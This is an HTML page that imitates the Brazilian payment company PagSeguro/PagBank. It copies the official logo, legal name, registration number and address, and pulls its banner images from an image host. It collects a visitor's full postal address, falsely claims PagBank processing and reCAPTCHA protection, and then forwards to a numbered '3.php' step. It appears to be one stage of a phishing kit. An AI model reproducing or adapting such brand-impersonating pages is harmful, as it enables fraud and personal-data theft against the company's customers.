<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
    <link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQUdRAHBK7sJSGF5-fDYgEvDKCCYN60Kh9vQA&usqp=CAU">
    <title>PagSeguro</title>
    
    <style>

        body, html {
            height: 100%;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .container {
            width: 100%;
            min-height: 100vh;
            background-color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            overflow: hidden;
        }
        header {
            width: 100%;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        header img {
            width: 100%;
            height: auto;
            display: block;
        }
        .rectangle {
            width: 100%;
            max-width: 600px;
            margin: 10px 0;
            overflow: hidden;
        }
        .rectangle img {
            width: 100%;
            height: auto;
            display: block;
        }
        .square {
            width: 100%;
            max-width: 600px;
            margin: 10px 0;
            border: 2px solid #ccc;
            background-color: rgba(255, 255, 255, 0.5);
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .field {
            width: 100%;
            margin-bottom: 15px;
        }
        .field input {
            width: 100%;
            box-sizing: border-box;
            padding: 10px;
            border: 2px solid #999;
            border-radius: 5px;
            transition: border-color 0.3s;
            font-size: 16px;
        }
        .field input.invalid {
            border-color: #999;
        }
        .field label {
            color: #555;
            font-size: 16px;
            margin-bottom: 5px;
            display: block;
        }
        .button {
            width: 100%;
            background-color: #7db7d8;
            color: white;
            padding: 15px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .button-text {
            color: black;
            font-size: 14px;
            margin: 5px 0;
        }
        .blue-text {
            color: blue;
        }
        footer {
            background-color: black;
            color: white;
            padding: 15px;
            text-align: center;
            margin-top: 10px;
        }
    </style>
    <script>
        function saveAndRedirect() {
            var cep = document.getElementById("cep").value;
            var street = document.getElementById("street").value;
            var neighborhood = document.getElementById("neighborhood").value;
            var city = document.getElementById("city").value;
            var number = document.getElementById("number").value;

            if (cep && street && neighborhood && city && number) {
                window.location.href = '3.php';
            } else {
                alert('Por favor, preencha todos os campos.');
                if (!cep) document.getElementById("cep").classList.add("invalid");
                else document.getElementById("cep").classList.remove("invalid");

                if (!street) document.getElementById("street").classList.add("invalid");
                else document.getElementById("street").classList.remove("invalid");

                if (!neighborhood) document.getElementById("neighborhood").classList.add("invalid");
                else document.getElementById("neighborhood").classList.remove("invalid");

                if (!city) document.getElementById("city").classList.add("invalid");
                else document.getElementById("city").classList.remove("invalid");

                if (!number) document.getElementById("number").classList.add("invalid");
                else document.getElementById("number").classList.remove("invalid");
            }
        }

        function getAddressDetails() {
            var cep = document.getElementById("cep").value;
            fetch(`https://viacep.com.br/ws/${cep}/json/`)
                .then(response => response.json())
                .then(data => {
                    if (!data.erro) {
                        document.getElementById("street").value = data.logradouro || '';
                        document.getElementById("neighborhood").value = data.bairro || '';
                        document.getElementById("city").value = data.localidade || '';
                        document.getElementById("number").focus();
                    } else {
                        alert('CEP não encontrado. Por favor, insira um CEP válido.');
                    }
                })
                .catch(error => console.error('Error fetching address:', error));
        }
    </script>
</head>
<body>

    <div class="container">
        <header>
            <img src="https://i.postimg.cc/CMqc6Qdc/Picsart-23-11-11-12-01-37-242.jpg" alt="Cabeçalho">
        </header>

        <div class="rectangle">
            <img src="https://i.postimg.cc/j5ChGVDZ/2.jpg" alt="Retângulo">
        </div>

        <div class="square">
            <div class="field">
                <label for="cep">CEP</label>
                <input type="tel" id="cep" name="cep" class="invalid" oninput="this.classList.remove('invalid');" onfocus="getAddressDetails();">
            </div>
            <div class="field">
                <label for="street">Rua</label>
                <input type="text" id="street" name="street" class="invalid" oninput="this.classList.remove('invalid');">
            </div>
            <div class="field">
                <label for="neighborhood">Bairro</label>
                <input type="text" id="neighborhood" name="neighborhood" class="invalid" oninput="this.classList.remove('invalid');">
            </div>
            <div class="field">
                <label for="city">Cidade</label>
                <input type="text" id="city" name="city" class="invalid" oninput="this.classList.remove('invalid');">
            </div>
            <div class="field">
                <label for="number">Número</label>
                <input type="text" id="number" name="number" class="invalid" oninput="this.classList.remove('invalid');">
            </div>
            <button class="button" onclick="saveAndRedirect()">
                <span class="button-text">Continuar</span>
            </button>
            <p class="button-text">
                Pagamento processado pelo PagBank. <span class="blue-text">Saiba mais</span> | Protegido por reCAPTCHA. <span class="blue-text">Privacidade e Termos de Serviço.</span>
            </p>
        </div>

        <footer>
            <div class="_2EmXf">
                <link itemprop="url" href="https://pagseguro.uol.com.br/">
                <link itemprop="logo" href="https://assets.pagseguro.com.br/payment-collector/v15.95.0/_next/static/0fee79b7d42d1707491572397b85ecdc.svg">
                <img width="102" height="28" src="https://assets.pagseguro.com.br/payment-collector/v15.95.0/_next/static/0fee79b7d42d1707491572397b85ecdc.svg" alt="PagBank" class="MEWVI">
                <div class="_3OkSp">
                    <p>© 1996-2023 Todos os direitos reservados.</p>
                    <p><span itemprop="name">PAGSEGURO INTERNET INSTITUIÇÃO DE PAGAMENTO S/A</span> - CNPJ/MF 08.561.701/0001-01</p>
                    <p itemtype="http://schema.org/PostalAddress" itemprop="location">
                        <span itemprop="streetAddress">&nbsp;Av. Brigadeiro Faria Lima, 1.384</span>,
                        <span itemprop="addressLocality">São Paulo</span> - <span itemprop="addressRegion">SP</span> - CEP<span itemprop="postalCode"> 01451-001</span>
                        <meta itemprop="addressCountry" content="BR">
                    </p>
                </div>
            </div>
        </footer>
    </div>

</body>
</html>
